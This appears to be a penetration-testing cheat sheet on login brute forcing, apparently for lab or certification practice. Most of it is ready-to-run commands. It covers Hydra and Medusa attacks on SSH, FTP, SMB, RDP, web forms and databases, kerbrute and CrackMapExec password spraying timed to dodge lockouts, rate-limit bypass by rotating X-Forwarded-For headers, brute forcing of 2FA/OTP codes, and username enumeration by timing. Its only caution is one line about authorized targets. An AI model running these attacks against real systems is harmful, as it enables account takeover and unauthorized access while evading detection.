# Login Brute Forcing

#bruteforce #auth #authentication #hydra #medusa #passwords

## What is this?

Automated credential testing against authentication interfaces. Covers Hydra and Medusa for protocols (SSH, FTP, SMB, RDP, HTTP forms), wordlist generation (cupp, CeWL), username enumeration via response analysis, and password spraying to avoid account lockouts.

---

## Tools

| Tool | Purpose |
|---|---|
| `Hydra` | Multi-protocol online brute forcer — SSH, FTP, SMB, RDP, HTTP |
| `Medusa` | Multi-threaded parallel brute forcer |
| `CrackMapExec` / `netexec` | SMB/AD password spraying with lockout tracking |
| `ffuf` | HTTP form brute force + username enumeration |
| `Burp Intruder` | GUI credential stuffing and form fuzzing |
| `cupp` | Targeted wordlist generation from personal info |
| `username-anarchy` | Username permutation from real names |
| `CeWL` | Crawl target site to build custom wordlist |
| `kerbrute` | Kerberos pre-auth username enumeration and brute force — fast, low-noise for AD |

---

## Attack Types

| Method | Description | Best When |
|---|---|---|
| `Dictionary` | Tries passwords from a wordlist | Target likely uses weak/common passwords |
| `Brute Force` | Tries all character combinations | No info available, short passwords |
| `Hybrid` | Wordlist + mutations (append/prepend chars) | Target uses slightly modified common passwords |
| `Password Spraying` | Few passwords × many usernames | Lockout policy in place — avoid detection |
| `Credential Stuffing` | Leaked creds from breaches → other services | Target suspected of password reuse |
| `Rainbow Table` | Pre-computed hash → plaintext lookup | Large number of hashes to crack offline |

---

## Wordlists

| Wordlist | Description |
|---|---|
| `/usr/share/wordlists/rockyou.txt` | ~14M leaked passwords from RockYou breach |
| `/usr/share/seclists/Passwords/2023-200_most_used_passwords.txt` | Top 200 common passwords |
| `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` | Common usernames (quick) |
| `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` | 10M usernames (thorough) |
| `/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt` | Default device credentials |

---

## Custom Wordlist Generation

### cupp — target-specific password list

```bash
sudo apt install cupp -y
cupp -i        # interactive — prompts for target info (name, DOB, pet, etc.)
```

### Username Anarchy — username permutations

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
./username-anarchy Jane Smith > jane_smith_usernames.txt
./username-anarchy -i /path/to/firstlast_names.txt > usernames.txt
```

### CeWL — scrape keywords from website

```bash
cewl https://www.example.com -d 3 -m 5 -w cewl_wordlist.txt
```

### Filter Wordlist by Password Policy

```bash
# Download base list
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10000.txt

# Apply policy filters (chain with pipes or step by step)
grep -E '^.{8,}$' darkweb2017-top10000.txt > filtered.txt          # min 8 chars
grep -E '[A-Z]' filtered.txt > filtered.txt                          # must have uppercase
grep -E '[a-z]' filtered.txt > filtered.txt                          # must have lowercase
grep -E '[0-9]' filtered.txt > filtered.txt                          # must have digit
grep -E '([!@#$%^&*].*){2,}' filtered.txt > final_wordlist.txt      # 2+ special chars

# One-liner
grep -E '^.{8,}$' base.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' > filtered.txt
```

---

## Hydra

### Syntax

```bash
hydra -l <user> -p <pass> <target> <service>
hydra -L users.txt -P passwords.txt <target> <service>
```

**Common flags:**

| Flag | Description |
|---|---|
| `-l` | Single username |
| `-L` | Username wordlist |
| `-p` | Single password |
| `-P` | Password wordlist |
| `-C` | Colon-separated `user:pass` list |
| `-s` | Custom port |
| `-t` | Threads (default 16) |
| `-f` | Stop after first valid login |
| `-V` | Verbose — show each attempt |
| `-u` | Loop users before passwords (spray mode) |

### SSH

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.129.x.x
hydra -L users.txt -P passwords.txt ssh://10.129.x.x -t 4
```

### FTP

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.129.x.x
```

### SMB

```bash
hydra -L users.txt -P passwords.txt smb://10.129.x.x
```

### RDP

```bash
hydra -L users.txt -P passwords.txt rdp://10.129.x.x -t 4
```

### HTTP Basic Auth

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.x.x http-get /protected/
```

Basic Auth header decoded: `Authorization: Basic YWxpY2U6c2VjcmV0` → `alice:secret` (base64)

### HTTP POST Form

```bash
# Syntax: http-post-form "/path:param1=^USER^&param2=^PASS^:F=<failure_string>"
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.x.x http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"

# With cookie
hydra -l admin -P passwords.txt 10.129.x.x http-post-form "/login:user=^USER^&pass=^PASS^:F=Login failed:H=Cookie: session=abc123"
```

### HTTP GET Form

```bash
hydra -l admin -P passwords.txt 10.129.x.x http-get-form "/login:username=^USER^&password=^PASS^:F=Invalid"
```

### MySQL / MSSQL / PostgreSQL

```bash
hydra -l root -P passwords.txt mysql://10.129.x.x
hydra -l sa -P passwords.txt mssql://10.129.x.x
hydra -l postgres -P passwords.txt postgres://10.129.x.x
```

### Password Spraying (avoid lockouts)

```bash
# -u loops usernames before moving to next password — better for spraying
hydra -L users.txt -P top_passwords.txt 10.129.x.x ssh -u -f
```

---

## Medusa

```bash
# Syntax
medusa -h <host> -u <user> -P <passlist> -M <module>

# SSH
medusa -h 10.129.x.x -u admin -P /usr/share/wordlists/rockyou.txt -M ssh

# FTP
medusa -h 10.129.x.x -u admin -P passwords.txt -M ftp

# HTTP Basic Auth
medusa -h 10.129.x.x -u admin -P passwords.txt -M http -m GET:/protected/

# HTTP POST Form
medusa -h 10.129.x.x -u admin -P passwords.txt -M web-form -m "FORM:username=&password=:FAIL=Invalid"

# SMB
medusa -h 10.129.x.x -U users.txt -P passwords.txt -M smbnt
```

**Common flags:**

| Flag | Description |
|---|---|
| `-h` | Target host |
| `-H` | Host file |
| `-u` | Single username |
| `-U` | Username file |
| `-p` | Single password |
| `-P` | Password file |
| `-M` | Module (service) |
| `-m` | Module-specific options |
| `-t` | Threads |
| `-f` | Stop after first success |

---

## Active Directory Attacks

### kerbrute — Kerberos Username Enumeration + Brute Force

Sends AS-REQ packets directly to the DC — no LDAP, no failed login events in the security log for invalid usernames. Valid usernames get a proper KRB error (PRINCIPAL_UNKNOWN vs PASSWORD_WRONG).

```bash
# Install
go install github.com/ropnop/kerbrute@latest
# or: download binary from https://github.com/ropnop/kerbrute/releases

# Username enumeration (no creds needed)
kerbrute userenum -d inlanefreight.htb --dc 172.16.5.5 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Password brute force against single user
kerbrute bruteuser -d inlanefreight.htb --dc 172.16.5.5 /usr/share/wordlists/rockyou.txt administrator

# Password spraying — one password, many users (lockout safe)
kerbrute passwordspray -d inlanefreight.htb --dc 172.16.5.5 users.txt 'Welcome1'

# Output valid users to file
kerbrute userenum -d inlanefreight.htb --dc 172.16.5.5 users.txt -o valid_users.txt
```

> [!note] Kerbrute username enum generates `4768` (TGT requests) in the DC event log but NOT `4625` (failed login) — much quieter than LDAP-based enumeration. Still visible to a tuned SIEM.

### CrackMapExec Password Spraying

Safe AD spraying: one password per lockout observation window across all accounts.

```bash
# Spray one password across all users
crackmapexec smb 172.16.5.5 -u users.txt -p 'Welcome1' --continue-on-success

# Spray multiple targets from a list
crackmapexec smb targets.txt -u users.txt -p 'Spring2024!' --continue-on-success

# Check lockout policy first
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --pass-pol

# Spray with hash (PTH)
crackmapexec smb 172.16.5.5 -u users.txt -H ntlm_hash.txt --continue-on-success

# Local admin spray
crackmapexec smb 172.16.5.0/24 -u administrator -p 'Password123' --local-auth --continue-on-success
```

**Safe spraying strategy:**
1. Enumerate lockout threshold: `crackmapexec smb <DC> -u user -p pass --pass-pol`
2. Set attempts to `threshold - 1` per window (usually spray once every 30-60 min)
3. Use `--continue-on-success` so CME doesn't stop on first hit
4. Track time between sprays — lockout observation window is typically 30 minutes

---

## Default Credentials

```bash
# Try known defaults before brute forcing
# https://github.com/ihebski/DefaultCreds-cheat-sheet
# /usr/share/seclists/Passwords/Default-Credentials/

hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt 10.129.x.x http-get /
```

Common defaults to try manually:

| Service | Common Defaults |
|---|---|
| Routers | `admin:admin`, `admin:password`, `admin:` |
| Tomcat | `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret` |
| Jenkins | `admin:admin`, `admin:password` |
| IPMI | `ADMIN:ADMIN` |
| Printers | `admin:admin`, `admin:1234` |
| MySQL | `root:` (empty), `root:root` |

---

## Web Application Notes

### Identifying Login Failure String

Intercept with Burp or curl to get the failure response, then use that string as the failure indicator in Hydra/Medusa:

```bash
curl -s -X POST http://10.129.x.x/login -d "username=baduser&password=badpass" | grep -i "error\|invalid\|fail"
```

### Rate Limit Bypass via Header Rotation

Some apps rate-limit by IP using headers like `X-Forwarded-For` or `X-Real-IP` rather than the actual source IP. Rotating the header value resets the rate limit counter.

```bash
# Hydra — inject rotating X-Forwarded-For with each attempt
# (Hydra doesn't natively rotate headers — use ffuf instead)

# ffuf — set X-Forwarded-For to FUZZ value alongside password attempt
# Create a numbered IP list first
seq 1 10000 | awk '{print "10.0."int($1/256)"."$1%256}' > fake_ips.txt

# Spray passwords with rotating IP header (use -H with FUZZ in two positions)
ffuf -w passwords.txt:PASS -w fake_ips.txt:IP \
  -X POST -d "username=admin&password=PASS" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: IP" \
  -u http://10.129.x.x/login -fs <failure_size>

# Other headers to try (some apps check only one)
# X-Forwarded-For
# X-Real-IP
# X-Client-IP
# X-Remote-IP
# X-Originating-IP
# CF-Connecting-IP
```

> [!warning] Only test rate limit bypass on authorized targets. Confirm the app is actually checking these headers before burning time — send a request with `X-Forwarded-For: 1.2.3.4` and check if the response changes.

### OTP / 2FA Brute Force

Short OTP codes (4-6 digits, no rate limit) can be brute forced within a valid session window.

```bash
# Generate all 6-digit OTP candidates
seq -w 000000 999999 > otp_codes.txt

# ffuf — brute force OTP field after successful username+password
# First: log in with valid creds to get a session cookie, then brute the OTP endpoint
ffuf -w otp_codes.txt \
  -X POST -d "otp=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: session=<valid_session_after_pw_step>" \
  -u http://10.129.x.x/verify-otp \
  -fs <failure_size> -t 10

# 4-digit TOTP/PIN (10000 candidates)
seq -w 0000 9999 > pin_codes.txt
```

**What to check before attempting:**
- Is there a rate limit on OTP attempts? (Intentionally send 5-10 wrong codes)
- Does the OTP expire quickly? (TOTP typically 30s — need fast enough thread rate)
- Is the session invalidated after N wrong OTP attempts?
- Does the OTP validation endpoint require the same session that passed the password step?

### Username Enumeration via Response Differences

- Different HTTP response codes for valid vs invalid users
- Different response times — valid user auth typically takes longer (hash comparison vs early rejection)
- Different error messages ("User not found" vs "Wrong password")

```bash
# If different response length for valid user:
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -X POST -d "username=FUZZ&password=wrongpass" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.129.x.x/login -fs <invalid_size>

# Timing-based enumeration — filter by response time (valid users take longer)
# ffuf -t 1 (single thread) for accurate timing comparison
ffuf -w usernames.txt -X POST -d "username=FUZZ&password=wrongpass" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://10.129.x.x/login -t 1 -v 2>&1 | grep -E "FUZZ|time"
# Look for outliers: response times 100-500ms above baseline indicate valid users
```

### Brute Force After Username Enumeration

```bash
ffuf -w passwords.txt -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.129.x.x/login -fs <failure_size>
```

---

*Created: 2026-02-27*
*Updated: 2026-05-14*
*Model: claude-sonnet-4-6*